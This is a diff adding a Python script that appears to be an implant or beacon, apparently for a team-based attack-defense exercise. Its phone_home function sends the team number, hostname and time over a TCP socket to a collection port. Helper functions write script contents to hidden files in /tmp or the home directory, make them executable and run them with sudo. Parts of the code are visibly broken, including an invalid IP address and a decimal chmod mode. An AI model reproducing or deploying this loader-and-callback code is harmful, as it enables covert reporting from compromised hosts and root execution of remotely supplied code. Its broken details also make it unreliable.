@@ -1,0 +1,53 @@
+#!/usr/bin/python
+
+import socket
+import time
+import os
+
+def get_team_number():
+  team_file_name = "/etc/team"
+
+  try:
+    with open(team_file_name, 'r') as file:
+      team_number = file.read()
+  except:
+    team_number = 0
+
+  return team_number
+
+def create_local_script(script_location, script_contents):
+  with open(script_location, "w") as file:
+    file.write(script_contents)
+
+def attempt_script_save(script_contents):
+  home_dir = os.path.expanduser("~")
+  possible_save_locations = ['/tmp/.ambipom.424',"{}/.ambipom.424".format(home_dir)]
+
+  for save_location in possible_save_locations:
+    try:
+      create_local_script(save_location, script_contents)
+      return save_location
+    except:
+      pass
+
+def run_script(script_location):
+  os.chmod(script_location, 777)
+  os.system("sudo {}".format(script_location))
+
+  
+def phone_home():
+    team_number = get_team_number()
+    to_send = "{},{},{}".format(team_number, socket.gethostname(),time.strftime("%Y-%m-%d_%H:%M"))
+    # create an ipv4 (AF_INET) socket object using the tcp protocol (SOCK_STREAM)
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    # connect the client
+    # client.connect((target, port))
+    client.connect(('127.0.0.0.1', 9999))
+
+    # send some data (in this case a HTTP GET request)
+    client.send(bytes(to_send.encode('utf8')))
+    # receive the response data (4096 is recommended buffer size)
+    response = client.recv(4096)
+
+    return(response)
